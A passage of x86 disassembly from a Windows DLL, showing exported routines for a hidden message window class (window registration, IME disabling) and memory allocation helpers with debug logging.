loc_6AF44B17:				; CODE XREF: Ordinal859+10j
		push	offset aChiddenwindo_0 ; "CHiddenWindow::WindowProc() :	WM_QUERYE"...
		call	sub_6AF31006
		mov	eax, [esi]
		pop	ecx
		mov	ecx, esi
		call	dword ptr [eax+1Ch]
		jmp	short loc_6AF44B57
; ---------------------------------------------------------------------------

loc_6AF44B2B:				; CODE XREF: Ordinal859+Bj
		push	offset aChiddenwindo_1 ; "CHiddenWindow::WindowProc() :	WM_DESTRO"...
		call	sub_6AF31006
		pop	ecx
		push	0		; dwNewLong
		push	0FFFFFFEBh	; nIndex
		push	dword ptr [esi+38h] ; hWnd
		call	ds:SetWindowLongA
		mov	eax, [esi]
		and	dword ptr [esi+38h], 0
		mov	ecx, esi
		call	dword ptr [eax+18h]
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+8]

loc_6AF44B55:				; CODE XREF: Ordinal859+54j
		xor	eax, eax

loc_6AF44B57:				; CODE XREF: Ordinal859+68j
		pop	esi
		pop	ebp
		retn	10h
Ordinal859	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF44B5C(HWND	hWnd)
sub_6AF44B5C	proc near		; DATA XREF: Ordinal856+A0o

hWnd		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	0FFFFFFEBh	; nIndex
		push	[ebp+hWnd]	; hWnd
		call	ds:GetWindowLongA
		test	eax, eax
		jnz	short loc_6AF44B75
		pop	ebp
		jmp	ds:DefWindowProcA
; ---------------------------------------------------------------------------

loc_6AF44B75:				; CODE XREF: sub_6AF44B5C+10j
		mov	edx, [eax]
		mov	ecx, eax
		pop	ebp
		jmp	dword ptr [edx+24h]
sub_6AF44B5C	endp

; Exported entry 846.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal846
Ordinal846	proc near		; CODE XREF: Ordinal856+19p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5C7D4
		mov	eax, esi
		pop	esi
		retn
Ordinal846	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF44B93(void *, char)
sub_6AF44B93	proc near		; DATA XREF: .rdata:off_6AF5C7D4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal847
		test	[esp+4+arg_0], 1
		jz	short loc_6AF44BA9
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF44BA9:				; CODE XREF: sub_6AF44B93+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF44B93	endp

; Exported entry 848.
; Exported entry 1062.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1062(LPCSTR Args)
		public Ordinal1062
Ordinal1062	proc near		; CODE XREF: Ordinal856+26p
					; Ordinal1074+38p
					; DATA XREF: ...

Args		= dword	ptr  4

		push	esi		; ccL30_848
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF44BCA
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF44BCE

loc_6AF44BCA:				; CODE XREF: Ordinal1062+Ej
		xor	eax, eax
		jmp	short loc_6AF44BEA
; ---------------------------------------------------------------------------

loc_6AF44BCE:				; CODE XREF: Ordinal1062+19j
		push	edi
		xor	edi, edi
		push	offset aImmdisableime ;	"ImmDisableIME"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF44BE7
		xor	edi, edi

loc_6AF44BE7:				; CODE XREF: Ordinal1062+34j
		mov	eax, edi
		pop	edi

loc_6AF44BEA:				; CODE XREF: Ordinal1062+1Dj
		pop	esi
		retn	4
Ordinal1062	endp

; Exported entry 849.
; Exported entry 1063.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal849(LPCSTR Args,	DWORD dwFlags)
		public Ordinal849
Ordinal849	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi		; ccL30_849
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF44C0D
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF44C11

loc_6AF44C0D:				; CODE XREF: Ordinal849+12j
		xor	eax, eax
		jmp	short loc_6AF44C2D
; ---------------------------------------------------------------------------

loc_6AF44C11:				; CODE XREF: Ordinal849+1Dj
		push	edi
		xor	edi, edi
		push	offset aImmdisableime ;	"ImmDisableIME"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF44C2A
		xor	edi, edi

loc_6AF44C2A:				; CODE XREF: Ordinal849+38j
		mov	eax, edi
		pop	edi

loc_6AF44C2D:				; CODE XREF: Ordinal849+21j
		pop	esi
		retn	8
Ordinal849	endp

; Exported entry 856.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __fastcall Ordinal856(LONG dwNewLong)
		public Ordinal856
Ordinal856	proc near		; DATA XREF: .rdata:6AF5CA1Co
					; .rdata:6AF5DDA8o ...

Dst		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
lpClassName	= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= byte ptr -14h
var_C		= dword	ptr -0Ch
lpWindowName	= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		push	ebx
		push	esi
		push	edi
		push	offset aChiddenwindowI ; "CHiddenWindow::InitInstance()\n"
		mov	edi, ecx
		call	sub_6AF31006
		pop	ecx
		lea	ecx, [ebp+var_14]
		call	Ordinal846
		push	offset aImm32_dll ; "IMM32.DLL"
		lea	ecx, [ebp+var_14]
		call	Ordinal1062
		xor	esi, esi
		test	eax, eax
		jz	short loc_6AF44C85
		cmp	[ebp+var_C], esi
		jz	short loc_6AF44C85
		push	dword ptr [edi+1Ch]
		call	[ebp+var_C]
		test	eax, eax
		jnz	short loc_6AF44C90
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCserviceappRun ; "CServiceApp::Run() : ImmDisableIME() =="...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF44C8F
; ---------------------------------------------------------------------------

loc_6AF44C85:				; CODE XREF: Ordinal856+2Fj
					; Ordinal856+34j
		push	offset aCserviceappR_0 ; "CServiceApp::Run() : imm32.Load() == FA"...
		call	sub_6AF31006

loc_6AF44C8F:				; CODE XREF: Ordinal856+52j
		pop	ecx

loc_6AF44C90:				; CODE XREF: Ordinal856+3Ej
		lea	ecx, [ebp+var_14]
		call	Ordinal847
		push	30h		; Size
		lea	eax, [ebp+Dst]
		push	esi		; Val
		push	eax		; Dst
		mov	[ebp+var_4], esi
		call	memset
		mov	eax, [edi+40h]
		mov	ebx, ds:GetModuleHandleA
		add	esp, 0Ch
		lea	ecx, [ebp+Dst]
		push	ecx		; lpwcx
		push	eax		; lpszClass
		push	esi		; lpModuleName
		call	ebx ; GetModuleHandleA
		push	eax		; hInstance
		call	ds:GetClassInfoExA
		test	eax, eax
		jnz	short loc_6AF44D28
		push	esi		; lpModuleName
		mov	[ebp+Dst], 30h
		mov	[ebp+var_40], esi
		mov	[ebp+var_3C], offset sub_6AF44B5C
		mov	[ebp+var_38], esi
		mov	[ebp+var_34], esi
		call	ebx ; GetModuleHandleA
		mov	[ebp+var_30], eax
		mov	eax, [edi+40h]
		mov	[ebp+lpClassName], eax
		lea	eax, [ebp+Dst]
		push	eax		; WNDCLASSEXA *
		mov	[ebp+var_2C], esi
		mov	[ebp+var_28], esi
		mov	[ebp+var_24], esi
		mov	[ebp+var_20], esi
		mov	[ebp+var_18], esi
		call	ds:RegisterClassExA
		cmp	ax, si
		mov	[edi+3Ch], ax
		jnz	short loc_6AF44D28
		mov	eax, [edi+40h]
		lea	ecx, [ebp+Dst]
		push	ecx		; lpwcx
		push	eax		; lpszClass
		push	esi		; lpModuleName
		call	ebx ; GetModuleHandleA
		push	eax		; hInstance
		call	ds:GetClassInfoExA
		test	eax, eax
		jnz	short loc_6AF44D28
		push	offset aChiddenwindo_2 ; "CHiddenWindow::InitInstance()	: Registe"...
		jmp	short loc_6AF44D7B
; ---------------------------------------------------------------------------

loc_6AF44D28:				; CODE XREF: Ordinal856+93j
					; Ordinal856+D8j ...
		mov	eax, [edi+44h]
		push	esi		; lpParam
		push	esi		; lpModuleName
		mov	[ebp+lpWindowName], eax
		call	ebx ; GetModuleHandleA
		push	eax		; hInstance
		push	esi		; hMenu
		push	esi		; hWndParent
		push	esi		; nHeight
		push	esi		; nWidth
		push	esi		; Y
		push	esi		; X
		push	esi		; dwStyle
		push	[ebp+lpWindowName] ; lpWindowName
		push	[ebp+lpClassName] ; lpClassName
		push	esi		; dwExStyle
		call	ds:CreateWindowExA
		cmp	eax, esi
		mov	[edi+38h], eax
		jnz	short loc_6AF44D55
		push	offset aChiddenwindo_3 ; "CHiddenWindow::InitInstance()	: CreateW"...
		jmp	short loc_6AF44D7B
; ---------------------------------------------------------------------------

loc_6AF44D55:				; CODE XREF: Ordinal856+11Bj
		push	esi		; dwErrCode
		call	ds:SetLastError
		push	edi		; dwNewLong
		push	0FFFFFFEBh	; nIndex
		push	dword ptr [edi+38h] ; hWnd
		call	ds:SetWindowLongA
		test	eax, eax
		jnz	short loc_6AF44D83
		call	ds:GetLastError
		test	eax, eax
		jz	short loc_6AF44D83
		push	offset aChiddenwindo_4 ; "CHiddenWindow::InitInstance()	: SetWind"...

loc_6AF44D7B:				; CODE XREF: Ordinal856+F5j
					; Ordinal856+122j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF44D8A
; ---------------------------------------------------------------------------

loc_6AF44D83:				; CODE XREF: Ordinal856+139j
					; Ordinal856+143j
		mov	[ebp+var_4], 1

loc_6AF44D8A:				; CODE XREF: Ordinal856+150j
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal856	endp

; Exported entry 860.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal860
Ordinal860	proc near		; CODE XREF: Ordinal853+9p
					; Ordinal854+56p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		push	0FFFFFFFFh
		call	dword ptr [eax+4]
		lea	ecx, [esi+40h]
		call	sub_6AF317A8
		lea	ecx, [esi+44h]
		pop	esi
		jmp	sub_6AF317A8
Ordinal860	endp

; Exported entry 852.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal852
Ordinal852	proc near		; CODE XREF: Ordinal1054+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1381
		and	dword ptr [esi+38h], 0
		and	word ptr [esi+3Ch], 0
		lea	ecx, [esi+40h]
		mov	dword ptr [esi], offset	off_6AF5CA0C
		call	sub_6AF318C3
		lea	ecx, [esi+44h]
		call	sub_6AF318C3
		mov	dword ptr [esi+34h], 1
		mov	eax, esi
		pop	esi
		retn
Ordinal852	endp

; Exported entry 853.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal853
Ordinal853	proc near		; CODE XREF: sub_6AF44E05+3p
					; Ordinal1055+6j
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5CA0C
		call	Ordinal860
		lea	ecx, [esi+44h]
		call	sub_6AF3789B
		lea	ecx, [esi+40h]
		call	sub_6AF3789B
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1382
Ordinal853	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF44E05(void *, char)
sub_6AF44E05	proc near		; DATA XREF: .rdata:off_6AF5CA0Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal853
		test	[esp+4+arg_0], 1
		jz	short loc_6AF44E1B
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF44E1B:				; CODE XREF: sub_6AF44E05+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF44E05	endp

; Exported entry 854.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal854(LPCSTR Src, int)
		public Ordinal854
Ordinal854	proc near		; CODE XREF: Ordinal1056+11Ap
					; DATA XREF: .rdata:off_6AF66098o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_88 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		xor	ebx, ebx
		cmp	[ebp+Src], ebx
		push	edi
		mov	esi, ecx
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		jz	loc_6AF44F82
		push	[ebp+Src]	; lpString
		mov	edi, ds:lstrlenA
		call	edi ; lstrlenA
		test	eax, eax
		jz	loc_6AF44F82
		cmp	[ebp+arg_4], ebx
		jz	loc_6AF44F82
		push	[ebp+arg_4]	; lpString
		call	edi ; lstrlenA
		test	eax, eax
		jz	loc_6AF44F82
		mov	ecx, esi
		call	Ordinal860
		push	offset aChiddenwindowC ; "CHiddenWindow::Create"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		push	[ebp+Src]	; Src
		mov	[ebp+var_4], ebx
		lea	ecx, [esi+40h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF31B1D
		push	[ebp+arg_4]	; Src
		lea	ecx, [esi+44h]
		call	sub_6AF31B1D
		jmp	loc_6AF44F48
; ---------------------------------------------------------------------------

loc_6AF44EAB:				; DATA XREF: .rdata:6AF63724o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF44F43
		retn
; ---------------------------------------------------------------------------

loc_6AF44EEE:				; DATA XREF: .rdata:6AF63734o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF44F43
		retn
; ---------------------------------------------------------------------------

loc_6AF44F43:				; DATA XREF: Ordinal854+C7o
					; Ordinal854+11Co
		mov	esi, [ebp+var_28]
		xor	ebx, ebx

loc_6AF44F48:				; CODE XREF: Ordinal854+85j
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF44F58

loc_6AF44F54:				; CODE XREF: Ordinal854+150j
		xor	esi, esi
		jmp	short loc_6AF44F76
; ---------------------------------------------------------------------------

loc_6AF44F58:				; CODE XREF: Ordinal854+131j
		push	ebx		; int
		push	ebx		; dwStackSize
		push	ebx		; lpThreadAttributes
		mov	ecx, esi	; lpParameter
		call	Ordinal1383
		test	eax, eax
		jnz	short loc_6AF44F73
		push	offset aChiddenwindo_5 ; "CHiddenWindow::Create() : CThread::Crea"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF44F54
; ---------------------------------------------------------------------------

loc_6AF44F73:				; CODE XREF: Ordinal854+143j
		xor	esi, esi
		inc	esi

loc_6AF44F76:				; CODE XREF: Ordinal854+135j
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	eax, esi
		jmp	short loc_6AF44F8F
; ---------------------------------------------------------------------------

loc_6AF44F82:				; CODE XREF: Ordinal854+25j
					; Ordinal854+38j ...
		push	offset aChiddenwindo_6 ; "CHiddenWindow::Create() : szClassName	="...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF44F8F:				; CODE XREF: Ordinal854+15Fj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal854	endp ; sp-analysis failed

; Exported entry 861.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal861
Ordinal861	proc near		; CODE XREF: Ordinal299+191p
					; Ordinal300+18Bp ...
		mov	eax, ecx
		xor	ecx, ecx
		mov	dword ptr [eax], offset	off_6AF5CAB4
		mov	[eax+4], ecx
		mov	[eax+8], ecx
		mov	[eax+0Ch], ecx
		retn
Ordinal861	endp

; Exported entry 867.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal867
Ordinal867	proc near		; CODE XREF: Ordinal868+4p
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	edx, [ecx+8]
		mov	eax, [esp+arg_0]
		cmp	edx, [eax+8]
		jnz	short loc_6AF44FE9
		push	esi
		mov	esi, [ecx+4]
		cmp	esi, [eax+4]
		pop	esi
		jnz	short loc_6AF44FE9
		push	edx		; Size
		push	dword ptr [eax+0Ch] ; Buf2
		push	dword ptr [ecx+0Ch] ; Buf1
		call	memcmp
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF44FE9
		mov	al, 1
		jmp	short locret_6AF44FEB
; ---------------------------------------------------------------------------

loc_6AF44FE9:				; CODE XREF: Ordinal867+Aj
					; Ordinal867+14j ...
		xor	al, al

locret_6AF44FEB:			; CODE XREF: Ordinal867+2Bj
		retn	4
Ordinal867	endp

; Exported entry 868.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal868
Ordinal868	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	[esp+arg_0]
		call	Ordinal867
		neg	al
		sbb	eax, eax
		inc	eax
		retn	4
Ordinal868	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF44FFF	proc near		; CODE XREF: Ordinal910+14p

arg_0		= byte ptr  4

		push	esi
		lea	eax, [esp+4+arg_0]
		push	eax
		mov	esi, ecx
		call	ds:??0exception@@QAE@ABQBD@Z ; exception::exception(char const * const &)
		mov	dword ptr [esi], offset	off_6AF5CAB8
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF44FFF	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF45019(void *, char)
sub_6AF45019	proc near		; DATA XREF: .rdata:off_6AF5CAB8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF45035
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4502F
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4502F:				; CODE XREF: sub_6AF45019+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF45019	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF45035	proc near		; CODE XREF: sub_6AF45019+3p
					; DATA XREF: .rdata:6AF63794o
		mov	dword ptr [ecx], offset	off_6AF5CAB8
		jmp	ds:??1exception@@UAE@XZ	; exception::~exception(void)
sub_6AF45035	endp

; Exported entry 874.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal874
Ordinal874	proc near		; CODE XREF: Ordinal250+26p
					; Ordinal307+34j ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+0Ch]
		push	edi
		xor	edi, edi
		cmp	eax, edi
		jz	short loc_6AF45082
		mov	ecx, [esi+4]
		dec	ecx
		dec	ecx
		jz	short loc_6AF4507B
		dec	ecx
		jz	short loc_6AF4506A
		dec	ecx
		jnz	short loc_6AF45082
		push	8000h		; dwFreeType
		push	edi		; dwSize
		push	eax		; lpAddress
		call	ds:VirtualFree
		jmp	short loc_6AF45082
; ---------------------------------------------------------------------------

loc_6AF4506A:				; CODE XREF: Ordinal874+15j
		push	eax		; lpMem
		push	edi		; dwFlags
		call	ds:GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapFree
		jmp	short loc_6AF45082
; ---------------------------------------------------------------------------

loc_6AF4507B:				; CODE XREF: Ordinal874+12j
		push	eax		; void *
		call	??_V@YAXPAX@Z	; operator delete[](void *)
		pop	ecx

loc_6AF45082:				; CODE XREF: Ordinal874+Bj
					; Ordinal874+18j ...
		mov	[esi+4], edi
		mov	[esi+0Ch], edi
		mov	[esi+8], edi
		pop	edi
		pop	esi
		retn
Ordinal874	endp

; Exported entry 876.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal876
Ordinal876	proc near		; CODE XREF: Ordinal291+34p
					; Ordinal292+36p
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, ecx
		call	Ordinal874
		mov	eax, [esp+4+arg_0]
		mov	[esi+0Ch], eax
		mov	eax, [esp+4+arg_4]
		mov	[esi+8], eax
		xor	eax, eax
		inc	eax
		mov	[esi+4], eax
		pop	esi
		retn	8
Ordinal876	endp

; Exported entry 877.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal877
Ordinal877	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+0Ch]
		xor	edx, edx
		mov	[ecx+0Ch], edx
		mov	[ecx+8], edx
		mov	[ecx+4], edx
		retn
Ordinal877	endp

; Exported entry 863.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal863
Ordinal863	proc near		; CODE XREF: Ordinal299+205p
					; Ordinal299+217p ...
		mov	dword ptr [ecx], offset	off_6AF5CAB4
		jmp	Ordinal874
Ordinal863	endp

; Exported entry 870.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal870
Ordinal870	proc near		; CODE XREF: Ordinal171+69p
					; Ordinal280+69p ...

var_60		= dword	ptr -60h
var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= byte ptr -4Ch
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_89 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 54h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		call	Ordinal874
		push	offset aCmemoryNewallo ; "CMemory::NewAlloc()"
		lea	ecx, [ebp+var_4C]
		call	Ordinal751
		mov	eax, [ebp+arg_0]
		and	[ebp+var_4], 0
		push	eax		; unsigned int
		mov	byte ptr [ebp+var_4], 1
		mov	dword ptr [esi+4], 2
		mov	[esi+8], eax
		call	j_??2@YAPAXI@Z	; operator new(uint)
		test	eax, eax
		pop	ecx
		mov	[esi+0Ch], eax
		jnz	loc_6AF451E5
		lea	eax, [ebp+var_2C]
		push	eax
		lea	ecx, [ebp+var_60]
		mov	[ebp+var_2C], offset aBadAllocation ; "bad allocation"
		call	ds:??0exception@@QAE@ABQBD@Z ; exception::exception(char const * const &)
		push	offset dword_6AF63790
		lea	eax, [ebp+var_60]
		push	eax
		mov	[ebp+var_60], offset off_6AF5CAB8
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4514A:				; DATA XREF: .rdata:6AF637C4o
		push	13h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	ecx, [ebp+var_54]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF451E2
		retn
; ---------------------------------------------------------------------------

loc_6AF4518D:				; DATA XREF: .rdata:6AF637D4o
		push	15h
		lea	ecx, [ebp+var_4C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_4C]
		call	Ordinal762
		mov	eax, [ebp+var_50]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_4C]
		call	Ordinal764
		lea	ecx, [ebp+var_4C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF451E2
		retn
; ---------------------------------------------------------------------------

loc_6AF451E2:				; DATA XREF: Ordinal870+BFo
					; Ordinal870+114o
		mov	esi, [ebp+var_28]

loc_6AF451E5:				; CODE XREF: Ordinal870+53j
		lea	ecx, [ebp+var_4C]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF45206
		push	offset aCmemoryNewal_0 ; "CMemory::NewAlloc() :	new() == NULL\n"
		call	sub_6AF3102E
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+4], 0
		pop	ecx
		jmp	short loc_6AF45216
; ---------------------------------------------------------------------------

loc_6AF45206:				; CODE XREF: Ordinal870+127j
		push	dword ptr [esi+8] ; Size
		push	0		; Val
		push	dword ptr [esi+0Ch] ; Dst
		call	memset
		add	esp, 0Ch

loc_6AF45216:				; CODE XREF: Ordinal870+13Cj
		mov	esi, [esi+0Ch]
		lea	ecx, [ebp+var_4C]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal870	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_6AF4523C	proc near		; DATA XREF: .rdata:6AF63780o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	ds:__imp_??0exception@@QAE@ABV0@@Z ; exception::exception(exception const &)
		mov	dword ptr [esi], offset	off_6AF5CAB8
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4523C	endp

; Exported entry 871.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal871(SIZE_T dwBytes)
		public Ordinal871
Ordinal871	proc near		; CODE XREF: Ordinal869+1Fp
					; DATA XREF: .rdata:off_6AF66098o

dwBytes		= dword	ptr  4

		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal874
		mov	eax, [esp+8+dwBytes]
		mov	edi, ds:GetProcessHeap
		push	eax		; dwBytes
		push	8		; dwFlags
		mov	dword ptr [esi+4], 3
		mov	[esi+8], eax
		call	edi ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapAlloc
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF4529A
		push	offset aCmemoryHeapall ; "CMemory::HeapAlloc() : HeapAlloc() ==	N"...
		call	sub_6AF3102E
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+4], 0
		pop	ecx
		jmp	short loc_6AF452A9
; ---------------------------------------------------------------------------

loc_6AF4529A:				; CODE XREF: Ordinal871+2Ej
		push	eax		; lpMem
		push	0		; dwFlags
		call	edi ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapSize
		mov	[esi+8], eax

loc_6AF452A9:				; CODE XREF: Ordinal871+43j
		mov	eax, [esi+0Ch]
		pop	edi
		pop	esi
		retn	4
Ordinal871	endp

; Exported entry 872.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal872
Ordinal872	proc near		; CODE XREF: Ordinal869+14p
					; DATA XREF: .rdata:off_6AF66098o

Dst		= byte ptr -24h
var_20		= dword	ptr -20h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	esi
		mov	esi, ecx
		call	Ordinal874
		push	24h		; Size
		lea	eax, [ebp+Dst]
		push	0		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+Dst]
		push	eax		; lpSystemInfo
		call	ds:GetSystemInfo
		mov	eax, [ebp+arg_0]
		xor	edx, edx
		div	[ebp+var_20]
		xor	ecx, ecx
		push	4
		cmp	ecx, edx
		sbb	ecx, ecx
